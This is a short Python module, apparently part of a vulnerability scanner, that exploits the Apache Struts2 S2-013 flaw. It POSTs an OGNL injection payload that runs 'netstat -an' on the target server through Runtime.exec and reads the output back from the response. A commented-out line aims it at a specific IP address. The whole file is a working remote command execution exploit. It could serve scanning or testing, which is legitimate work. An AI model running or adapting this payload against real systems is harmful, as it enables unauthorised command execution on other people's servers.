import requests
# url随意
class Exploit:
    def attack(self, url):
        print('test {} --> struts2_013'.format(url))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        exp = '''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('netstat -an').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}'''
        try:
            resp = requests.post(url, data=exp, headers=headers, timeout=10)
            if "0.0.0.0" in resp.text:
                return "s2-013"
        except:
            #print('test --> struts2_013 Failed!')
            return None
#print(Exploit().attack('http://207.246.73.172:83/'))